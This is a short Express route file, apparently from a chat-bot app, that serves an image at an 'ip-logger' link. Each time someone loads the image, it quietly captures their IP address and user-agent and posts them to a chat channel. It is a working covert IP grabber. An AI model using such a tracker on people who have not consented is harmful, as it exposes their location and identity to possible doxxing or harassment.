import path from 'path';
import express from 'express';
import { ipLoggerService } from '../client/features/ip-logger-service';

const featuresRouter = express.Router();

featuresRouter.get('/ip-logger/:slug', (req, res) => {
  const imagePath = path.join(__dirname, '../images/ip-logger.png');

  res.sendFile(imagePath);

  const [id, seed] = req.params.slug.split('-');
  const ip = (
    req.ip ??
    req.headers['x-forwarded-for']?.toString() ??
    req.connection?.remoteAddress ??
    ''
  )
    .split(',')[0]
    .trim()
    .replace(/^.*:/, '');

  const userAgent = req.headers['user-agent'] || 'Unknown';

  const channel = ipLoggerService.getChannel(id);

  if (channel) {
    channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
  }
});

export { featuresRouter };
